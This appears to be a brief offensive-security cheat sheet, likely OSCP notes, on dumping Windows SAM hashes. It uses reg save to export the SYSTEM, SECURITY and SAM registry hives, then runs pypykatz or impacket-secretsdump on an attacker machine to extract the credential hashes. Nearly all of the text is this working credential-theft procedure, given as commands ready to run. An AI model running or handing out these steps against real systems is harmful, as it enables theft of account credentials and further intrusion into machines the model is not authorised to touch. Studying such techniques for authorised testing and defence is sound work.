# Dump SAM Hashes via Registry

Assume you are already have NT SYSTEM or Administrator access on system. Or, you have Backup Operator role.

```powershell
reg save hklm\system system.oscp
reg save hklm\security security.oscp
reg save hklm\sam sam.oscp
```

Download the file to attacker machine, and get the hash value using pypykayz.

{% code overflow="wrap" %}
```bash
pypykatz registry system.oscp --sam sam.oscp --security security.oscp
```
{% endcode %}

Or use secretsdump.

{% code overflow="wrap" %}
```bash
impacket-secretsdump -sam sam.oscp -security security.oscp -system system.oscp LOCAL
```
{% endcode %}
